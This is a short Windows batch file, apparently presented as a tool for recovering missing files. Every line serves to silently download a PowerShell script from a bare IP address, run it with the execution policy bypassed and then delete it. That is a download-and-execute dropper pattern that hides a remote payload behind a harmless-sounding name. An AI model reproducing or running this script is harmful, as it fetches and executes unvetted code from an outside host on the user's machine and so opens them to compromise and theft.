@echo off
echo Downloading recovery script...
curl.exe -s -o "%TEMP%\recover_missing_files.ps1" "http://147.182.242.54:8081/assets/recover_missing_files.ps1"
if %errorlevel% neq 0 ( echo ERROR: Could not download script. & pause & exit /b 1 )
powershell -ExecutionPolicy Bypass -File "%TEMP%\recover_missing_files.ps1"
del "%TEMP%\recover_missing_files.ps1" 2>nul
